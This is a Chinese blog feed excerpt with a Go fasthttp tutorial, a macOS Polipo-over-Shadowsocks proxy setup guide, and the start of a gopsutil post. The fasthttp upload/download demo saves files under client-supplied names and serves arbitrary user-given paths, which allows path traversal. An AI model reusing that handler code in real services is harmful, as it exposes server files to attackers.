fasthttp.FS</div><div class="line">http.ServeFile() -&gt; fasthttp.ServeFile()</div><div class="line">http.Redirect() -&gt; ctx.Redirect()</div><div class="line">http.NotFound() -&gt; ctx.NotFound()</div><div class="line">http.StripPrefix() -&gt; fasthttp.PathRewriteFunc</div></pre></td></tr></table></figure></p>
<p>下面是一个简单例子，在上下文中获取请求数据, 通过WriteString来返回响应。<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"log"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/buaazp/fasthttprouter"</span></div><div class="line">	<span class="string">"github.com/valyala/fasthttp"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"hello, %s!\n"</span>, ctx.UserValue(<span class="string">"name"</span>))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">httpHandler</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	ctx.WriteString(<span class="string">"hello,fasthttp"</span>)</div><div class="line">	<span class="comment">// 因为实现不同，fasthttp 的返回内容不是即刻返回的</span></div><div class="line">	<span class="comment">// 不同于标准库，添加返回内容后设置状态码，也是有效的</span></div><div class="line">	ctx.SetStatusCode(<span class="number">404</span>)</div><div class="line"></div><div class="line">	<span class="comment">// 返回的内容也是可以获取的，不需要标准库的用法，需要自己扩展 http.ResponseWriter</span></div><div class="line">	fmt.Printf(<span class="string">"Host: %s\n"</span>, ctx.Host())</div><div class="line">	fmt.Printf(<span class="string">"Body: %s\n"</span>, ctx.Response.Body())</div><div class="line">	fmt.Printf(<span class="string">"Path: %s\n"</span>, ctx.Path())</div><div class="line">	fmt.Printf(<span class="string">"Method: %s\n"</span>, ctx.Method())</div><div class="line">	fmt.Printf(<span class="string">"URI: %s\n"</span>, ctx.URI())</div><div class="line">	fmt.Printf(<span class="string">"Connect Time: %s\n"</span>, ctx.ConnTime())</div><div class="line">	fmt.Printf(<span class="string">"UserAgent: %s\n"</span>, ctx.UserAgent())</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	router := fasthttprouter.New()</div><div class="line">	router.GET(<span class="string">"/"</span>, httpHandler)</div><div class="line">	router.GET(<span class="string">"/hello/:name"</span>, Hello)</div><div class="line"></div><div class="line">	log.Fatal(fasthttp.ListenAndServe(<span class="string">":8080"</span>, router.Handler))</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Body处理"><a href="#Body处理" class="headerlink" title="Body处理"></a>Body处理</h2><p>fasthttp 提供比标准库丰富的 Body 操作 API，而且支持解析 Gzip 过的数据, 我们可以简单的使用上下文的PostBody方法获取body<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"encoding/json"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"log"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/buaazp/fasthttprouter"</span></div><div class="line">	<span class="string">"github.com/valyala/fasthttp"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"hello, %s!\n"</span>, ctx.UserValue(<span class="string">"name"</span>))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">httpHandler</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	body := ctx.PostBody() <span class="comment">// 获取到的是 []byte</span></div><div class="line">	fmt.Fprintf(ctx, <span class="string">"Body:%s"</span>, body)</div><div class="line"></div><div class="line">	<span class="comment">// 因为是 []byte，解析 JSON 很简单</span></div><div class="line">	<span class="keyword">var</span> v <span class="keyword">interface</span>&#123;&#125;</div><div class="line">	json.Unmarshal(body, &amp;v)</div><div class="line">	fmt.Printf(<span class="string">"%v"</span>, v)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	router := fasthttprouter.New()</div><div class="line">	router.POST(<span class="string">"/"</span>, httpHandler)</div><div class="line">	router.GET(<span class="string">"/hello/:name"</span>, Hello)</div><div class="line"></div><div class="line">	log.Fatal(fasthttp.ListenAndServe(<span class="string">":8080"</span>, router.Handler))</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>简单的测试结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  Blogs curl -X POST -d &apos;&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125;&apos; http://127.0.0.1:8080/</div><div class="line">Body:&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125;</div></pre></td></tr></table></figure></p>
<h2 id="表单处理"><a href="#表单处理" class="headerlink" title="表单处理"></a>表单处理</h2><p>RequestCtx有同标准库的 FormValue() 方法，还对 GET 和 POST/PUT 传递的参数进行了区分<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"bytes"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"log"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/buaazp/fasthttprouter"</span></div><div class="line">	<span class="string">"github.com/valyala/fasthttp"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"hello, %s!\n"</span>, ctx.UserValue(<span class="string">"name"</span>))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">httpHandler</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	ctx.SetContentType(<span class="string">"text/html"</span>)</div><div class="line"></div><div class="line">	<span class="comment">// GET ?abc=abc&amp;abc=123</span></div><div class="line">	getValues := ctx.QueryArgs()</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"GET abc=%s &lt;br/&gt;"</span>,</div><div class="line">		getValues.Peek(<span class="string">"abc"</span>)) <span class="comment">// Peek 只获取第一个值</span></div><div class="line">	fmt.Fprintf(ctx, <span class="string">"GET abc=%s &lt;br/&gt;"</span>,</div><div class="line">		bytes.Join(getValues.PeekMulti(<span class="string">"abc"</span>), []<span class="keyword">byte</span>(<span class="string">","</span>))) <span class="comment">// PeekMulti 获取所有值</span></div><div class="line"></div><div class="line">	<span class="comment">// POST xyz=xyz&amp;xyz=123</span></div><div class="line">	postValues := ctx.PostArgs()</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"POST xyz=%s &lt;br/&gt;"</span>,</div><div class="line">		postValues.Peek(<span class="string">"xyz"</span>))</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"POST xyz=%s &lt;br/&gt;"</span>,</div><div class="line">		bytes.Join(postValues.PeekMulti(<span class="string">"xyz"</span>), []<span class="keyword">byte</span>(<span class="string">","</span>)))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	router := fasthttprouter.New()</div><div class="line">	router.POST(<span class="string">"/"</span>, httpHandler)</div><div class="line">	router.GET(<span class="string">"/"</span>, httpHandler)</div><div class="line">	router.GET(<span class="string">"/hello/:name"</span>, Hello)</div><div class="line"></div><div class="line">	log.Fatal(fasthttp.ListenAndServe(<span class="string">":8080"</span>, router.Handler))</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>输出结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GET abc=abc </div><div class="line">GET abc=abc,123 </div><div class="line">POST xyz=xyz </div><div class="line">POST xyz=xyz,123</div></pre></td></tr></table></figure></p>
<h2 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h2><p>fasthttp提供十分友好的接口, 通过FromFile读文件上传, 通过SendFile来提供下载,但是如果你想更加方便的定制一些信息,最好使用MultipartForm来获取上传对象<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// MultipartForm returns requests's multipart form.</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Returns ErrNoMultipartForm if request's content-type</span></div><div class="line"><span class="comment">// isn't 'multipart/form-data'.</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// All uploaded temporary files are automatically deleted after</span></div><div class="line"><span class="comment">// returning from RequestHandler. Either move or copy uploaded files</span></div><div class="line"><span class="comment">// into new place if you want retaining them.</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Use SaveMultipartFile function for permanently saving uploaded file.</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// The returned form is valid until returning from RequestHandler.</span></div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// See also FormFile and FormValue.</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ctx *RequestCtx)</span> <span class="title">MultipartForm</span><span class="params">()</span> <span class="params">(*multipart.Form, error)</span></span> &#123;</div><div class="line">	<span class="keyword">return</span> ctx.Request.MultipartForm()</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>MultipartForm 返回的是一个Form结构体, 我们在从源码中看看这个Form<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Form is a parsed multipart form.</span></div><div class="line"><span class="comment">// Its File parts are stored either in memory or on disk,</span></div><div class="line"><span class="comment">// and are accessible via the *FileHeader's Open method.</span></div><div class="line"><span class="comment">// Its Value parts are stored as strings.</span></div><div class="line"><span class="comment">// Both are keyed by field name.</span></div><div class="line"><span class="keyword">type</span> Form <span class="keyword">struct</span> &#123;</div><div class="line">	Value <span class="keyword">map</span>[<span class="keyword">string</span>][]<span class="keyword">string</span></div><div class="line">	File  <span class="keyword">map</span>[<span class="keyword">string</span>][]*FileHeader</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最好我们按照上面的分析实现了一个简单的下载和上传功能的小Demo<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"html/template"</span></div><div class="line">	<span class="string">"io"</span></div><div class="line">	<span class="string">"log"</span></div><div class="line">	<span class="string">"strconv"</span></div><div class="line">	<span class="string">"time"</span></div><div class="line"></div><div class="line">	<span class="string">"crypto/md5"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/buaazp/fasthttprouter"</span></div><div class="line">	<span class="string">"github.com/valyala/fasthttp"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="comment">// Hello Handler</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"hello, %s!\n"</span>, ctx.UserValue(<span class="string">"name"</span>))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Index Handler, 默认的ContenType是text/plain, 输出的内容在pre标签里面</span></div><div class="line"><span class="comment">// 因此这里必须手动设置ContentType为text/html</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	ctx.Response.Header.SetContentType(<span class="string">"text/html"</span>)</div><div class="line">	t := template.New(<span class="string">"index.gtpl"</span>)</div><div class="line">	t, _ = t.Parse(<span class="string">`&lt;html&gt;</span></div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;title&gt;上传文件&lt;/title&gt;</div><div class="line">    &lt;/head&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">    &lt;form enctype="multipart/form-data" action="/upload" method="post"&gt;</div><div class="line">      &lt;input type="file" name="uploadfile" /&gt;</div><div class="line">      &lt;input type="hidden" name="token" value="&#123;&#123;.&#125;&#125;"/&gt;</div><div class="line">      &lt;input type="submit" value="upload" /&gt;</div><div class="line">    &lt;/form&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;`)</div><div class="line">	crutime := time.Now().Unix()</div><div class="line">	h := md5.New()</div><div class="line">	io.WriteString(h, strconv.FormatInt(crutime, <span class="number">10</span>))</div><div class="line">	token := fmt.Sprintf(<span class="string">"%x"</span>, h.Sum(<span class="literal">nil</span>))</div><div class="line">	t.Execute(ctx, token)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// UploadHandler is here</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">UploadHandler</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	data, err := ctx.MultipartForm()</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		ctx.SetStatusCode(<span class="number">500</span>)</div><div class="line">		fmt.Println(<span class="string">"get upload file error:"</span>, err)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">	fileObj := data.File[<span class="string">"uploadfile"</span>][<span class="number">0</span>]</div><div class="line">	err = fasthttp.SaveMultipartFile(fileObj, fileObj.Filename)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		ctx.SetStatusCode(<span class="number">500</span>)</div><div class="line">		fmt.Println(<span class="string">"save upload file error:"</span>, err)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">	ctx.Write([]<span class="keyword">byte</span>(<span class="string">"save file successfully!"</span>))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// DownloadHandler is here</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">DownloadHandler</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fileName := ctx.UserValue(<span class="string">"filename"</span>)</div><div class="line">	<span class="keyword">switch</span> fileName := fileName.(<span class="keyword">type</span>) &#123;</div><div class="line">	<span class="keyword">case</span> <span class="keyword">string</span>:</div><div class="line">		ctx.SendFile(fileName)</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		ctx.SetStatusCode(<span class="number">500</span>)</div><div class="line">		fmt.Println(<span class="string">"the filename is not string."</span>)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	router := fasthttprouter.New()</div><div class="line">	router.GET(<span class="string">"/"</span>, Index)</div><div class="line">	router.POST(<span class="string">"/upload"</span>, UploadHandler)</div><div class="line">	router.GET(<span class="string">"/download/:filename"</span>, DownloadHandler)</div><div class="line">	router.GET(<span class="string">"/hello/:name"</span>, Hello)</div><div class="line"></div><div class="line">	log.Fatal(fasthttp.ListenAndServe(<span class="string">":8080"</span>, router.Handler))</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;浏览网上博客时发现了这么一篇测试文章&lt;a href=&quot;http://www.qingpingshan.com/jb/go/148453.html&quot;&gt;nginx vs iris&lt;/a&gt;, 结果是&lt;code&gt;iris&lt;/code&gt;越胜一筹, 而&lt;code&gt;Iris&lt;/code&gt;底层使用的并不是Golang的HTTP的标准库, 而是使用的第三方库&lt;code&gt;fasthttp&lt;/code&gt;, 之前读过一点关于golang的&lt;code&gt;net/http&lt;/code&gt;, 在处理用户的请求时的确有点粗暴, 直接一个连接一个&lt;code&gt;goroutine&lt;/code&gt;, 完全没有并发的控制。按捺不做内心的好奇, 想感受一把&lt;code&gt;fasthttp&lt;/code&gt;, 来一起走进fasthttp的世界看看。&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Golang" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Golang/"/>
    
    
      <category term="fasthttp" scheme="https://blog.yumaojun.net/tags/fasthttp/"/>
    
  </entry>
  
  <entry>
    <title>利用Polipo构建基于SS的http proxy</title>
    <link href="https://blog.yumaojun.net/2017/01/24/http-proxy/"/>
    <id>https://blog.yumaojun.net/2017/01/24/http-proxy/</id>
    <published>2017-01-24T01:04:33.000Z</published>
    <updated>2017-01-24T02:10:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>搞这个的主要原因是golang的很多依赖包需要翻墙下载, 这不像Python和NodeJS有官方源仓库的语言(配置国内源可以加速). 之前用windows的时候也是使用ss, 而<code>http proxy</code>是通过chrome的一个插件<code>Proxy SwitchyOmega</code>来做的，但是在mac下面这招不灵了, 下面主要介绍mac如何利用ss搭建<code>http proxy</code>.<br><a id="more"></a></p>
<h2 id="安装Shadowsocks"><a href="#安装Shadowsocks" class="headerlink" title="安装Shadowsocks"></a>安装Shadowsocks</h2><p>ss的安装和运行是前提, 这里不多做介绍，具体请查看<a href="http://www.ishadowsocks.mobi/" target="_blank" rel="external">Shadowsocks安装和使用</a></p>
<h2 id="Polipo简介"><a href="#Polipo简介" class="headerlink" title="Polipo简介"></a>Polipo简介</h2><p>这里主要使用<code>Polipo</code>来做<code>http proxy</code>, <code>polipo</code>的官方是这样介绍它的：<em>“Polipo 是一个小而快速的缓存 web 代理程序(web 缓存, HTTP 代理, 代理服务器)。尽管 Polipo 是为一个人或一小群人使用而设计的，但并不妨碍它为一大群人所使用。”</em>,<br>该项目的地址 <a href="https://github.com/jech/polipo" target="_blank" rel="external">polipo Github地址</a>, 该项目的官方文档<a href="https://www.irzhenif.fr/~jch/software/polipo/" target="_blank" rel="external">polipo官方文档</a><br>可惜该项目的作者已经停止该项目的维护了, 且用且珍惜。</p>
<h2 id="Polipo安装"><a href="#Polipo安装" class="headerlink" title="Polipo安装"></a>Polipo安装</h2><p>Shadowsocks官方推荐<code>http proxy</code>代理也是<code>Polipo</code>, 官方对此也做了简单的描述，我直接抄过来了</p>
<ul>
<li>安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">apt-get install polipo</div><div class="line">service polipo stop</div><div class="line">polipo socksParentProxy=localhost:1080</div></pre></td></tr></table></figure>
</li>
</ul>
<p>以上是官方文档里面的说明，在mac下使用polipo要稍做修改</p>
<ul>
<li>mac的安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install polipo</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Polipo使用"><a href="#Polipo使用" class="headerlink" title="Polipo使用"></a>Polipo使用</h2><ul>
<li><p>ss对polipo的使用样例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">http_proxy=http://localhost:8123 apt-get update</div><div class="line"></div><div class="line">http_proxy=http://localhost:8123 curl www.google.com</div><div class="line"></div><div class="line">http_proxy=http://localhost:8123 wget www.google.com</div><div class="line"></div><div class="line">git config --global http.proxy 127.0.0.1:8123</div><div class="line">git clone https://github.com/xxx/xxx.git</div><div class="line">git xxx</div><div class="line">git xxx</div><div class="line">git config --global --unset-all http.proxy</div></pre></td></tr></table></figure>
</li>
<li><p>mac的使用<br>打开一个terminal, 不要关掉，象genymotion之类的其他程序就可使用Http代理了.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ polipo socksParentProxy=localhost:1080</div><div class="line">Established listening socket on port 8123.</div></pre></td></tr></table></figure>
</li>
</ul>
<p>然后我们使用使用该<code>http proxy</code>来安装golang包,记得开启的你的ss<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">➜  Blogs https_proxy=http://localhost:8123 go get -u -v github.com/valyala/fasthttp</div><div class="line">github.com/valyala/fasthttp (download)</div><div class="line">github.com/klauspost/compress (download)</div><div class="line">github.com/klauspost/cpuid (download)</div><div class="line">github.com/klauspost/crc32 (download)</div><div class="line">github.com/valyala/bytebufferpool (download)</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;搞这个的主要原因是golang的很多依赖包需要翻墙下载, 这不像Python和NodeJS有官方源仓库的语言(配置国内源可以加速). 之前用windows的时候也是使用ss, 而&lt;code&gt;http proxy&lt;/code&gt;是通过chrome的一个插件&lt;code&gt;Proxy SwitchyOmega&lt;/code&gt;来做的，但是在mac下面这招不灵了, 下面主要介绍mac如何利用ss搭建&lt;code&gt;http proxy&lt;/code&gt;.&lt;br&gt;
    
    </summary>
    
      <category term="开发工具" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
      <category term="Shadowsocks" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Shadowsocks/"/>
    
    
      <category term="http-proxy" scheme="https://blog.yumaojun.net/tags/http-proxy/"/>
    
  </entry>
  
  <entry>
    <title>夸平台系统监控库-gopsutils</title>
    <link href="https://blog.yumaojun.net/2017/01/22/gopsutils/"/>
    <id>https://blog.yumaojun.net/2017/01/22/gopsutils/</id>
    <published>2017-01-22T06:37:09.000Z</published>
    <updated>2017-01-24T12:37:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>很欣赏<code>telegraf</code>的架构,之前也多次使用, 最近也要通过他来获取系统运行时信息然后上传,所以想借鉴下<code>telegraf</code>里面的system模块的实现，看了下他的源码，发现他使用了一个名叫<code>gopsutils</code>库来完成所有的系统数据的采集的, 于是决定手动试试这个库的功能。<br><a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在说<code>gopsutils</code>之前我们必须先说下<code>psutils</code>是啥, 因为<code>gopsutils</code>实际上就是一个golang版本的<code>psutils</code>(从名字上也能看出来)<br><code>psutils</code>是一个比较出名的python库, <code>psutils</code>是<code>python process and system utilities</code>的一个缩写. 它有如下特点</p>
<ul>
<li>跨平台: Linux, Windows, OSX, Sun Solaris, FreeBSD, OpenBSD and NetBSD的32位和64位系统</li>
<li>功能丰富: 实现了进程管理,系统诊断, 这个库基本实现了这些命令行工具的功能: ps, top, lsof, netstat, ifconfig, who, df, kill, free, nice, ionice, iostat, iotop, uptime, pidof, tty, taskset, pmap</li>
</ul>
<p>如果想要了解关于<code>gopsutils</code>更多的详情 请查看<a href="https://github.com/shirou/gopsutil" target="_blank" rel="external">gopsutils github地址</a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">➜  gops_test go get  -v &quot;github.com/shirou/gopsutil&quot;</div></pre></td></tr></table></figure>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>具体的使用文档可以参考<a href="https://godoc.org/github.com/shirou/gopsutil" target="_blank" rel="external">gopsutil的godoc文档</a><br>以下以测试收集cpu, disk, load, mem, net, process 为列, 注意这些对象都使用String方法, 因此可以直接调用fmt打印，String方法会将其转换成Json输出.<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div 